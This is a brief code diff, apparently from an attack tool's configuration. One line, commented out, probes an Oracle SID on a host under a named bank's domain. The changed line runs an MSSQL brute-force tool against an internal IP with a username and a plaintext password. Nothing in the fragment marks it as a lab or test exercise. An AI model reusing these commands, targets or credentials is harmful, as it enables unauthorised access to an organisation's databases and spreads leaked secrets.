@@ -6,4 +6,4 @@
 
 /* ora_sid -s pegasus.sys.yapikredi.com.tr -p 1802 -sid DPSTLIVE */
 
-mssql_brute -s OPCTRIAD -p 1775 -db MASTER -user entuser -passwd ''
+mssql_brute -s 10.60.101.113 -p 1433 -db MASTER -user entuser  -passwd Adem#123 
